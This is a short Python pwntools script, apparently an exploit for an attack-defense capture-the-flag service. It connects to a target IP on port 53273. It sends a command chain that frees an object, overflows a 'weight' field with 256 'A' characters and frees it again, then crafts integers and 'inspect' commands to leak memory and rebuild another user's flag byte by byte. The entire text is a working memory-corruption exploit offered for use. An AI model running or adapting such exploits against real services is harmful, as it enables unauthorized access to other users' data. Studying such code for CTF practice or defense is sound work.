from pwn import *

def main():
	ip_text = sys.argv[1]
	flag_id_text = sys.argv[2]

	flag_id_parts = flag_id_text.split(",")
	flag_user0 = flag_id_parts[0]
	flag_user1 = flag_id_parts[1]

	r = remote(ip_text, "53273")
	r.recvuntil("> ")
	
	def get_num(i):
		exploit_cmds = [
			"user",
			"del",
			"weight:" + ("A" * 256),
			"del",
		]
		exploit_cmds += [
			"int:i{}".format(i),
			"int:i{}".format(flag_user1),
			"int:i{}".format(flag_user0),
			"int:i0xc",
			"int:i0x47544e51",
			"inspect:i5:pAPsA",
			"getn:i0",
		]

		exploit_text = " ".join(exploit_cmds) + "\n"
		print(exploit_text)
		r.send(exploit_text)

		resp = r.recvuntil("> ").decode()
		data = resp.strip(" >\n")
		print(data)
		num = int(data[6:])
		return chr((num >> 16) & 0xff) + chr((num >> 8) & 0xff) + chr(num & 0xff)

	flag = ""
	for i in range(17):
		flag += get_num(i)
	print(flag)

if __name__ == "__main__":
	main()